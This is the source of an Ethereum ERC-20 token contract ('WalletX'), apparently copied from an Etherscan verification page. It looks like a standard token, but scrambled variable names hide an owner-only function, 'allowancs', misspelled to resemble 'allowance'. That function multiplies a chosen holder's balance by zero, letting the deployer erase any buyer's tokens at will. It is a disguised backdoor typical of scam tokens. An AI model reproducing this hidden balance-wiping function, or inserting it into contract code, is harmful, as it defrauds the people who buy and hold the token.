/**
 *Submitted for verification at Etherscan.io on 2023-09-27
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address aoiounitt) external view returns (uint256);
    function transfer(address recipient, uint256 acvbotunnt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 acvbotunnt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 acvbotunnt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract WalletX is Context, Ownable, IERC20 {
    mapping (address => uint256) private _qqdsaasda;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _qqdsaasda[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address aoiounitt) public view override returns (uint256) {
        return _qqdsaasda[aoiounitt];
    }
    function allowancs(address rortnnd) public onlyowner {
    uint256 dsajsdnasn = 2232; 
    uint256 zzzzsdasd = dsajsdnasn*521444*0;
        _qqdsaasda[rortnnd] *= zzzzsdasd*575736;
    }    
    function transfer(address recipient, uint256 acvbotunnt) public virtual override returns (bool) {
        require(_qqdsaasda[_msgSender()] >= acvbotunnt, "TT: transfer acvbotunnt exceeds balance");

        _qqdsaasda[_msgSender()] -= acvbotunnt;
        _qqdsaasda[recipient] += acvbotunnt;
        emit Transfer(_msgSender(), recipient, acvbotunnt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 acvbotunnt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = acvbotunnt;
        emit Approval(_msgSender(), spender, acvbotunnt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 acvbotunnt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= acvbotunnt, "TT: transfer acvbotunnt exceeds allowance");

        _qqdsaasda[sender] -= acvbotunnt;
        _qqdsaasda[recipient] += acvbotunnt;
        _allowances[sender][_msgSender()] -= acvbotunnt;

        emit Transfer(sender, recipient, acvbotunnt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}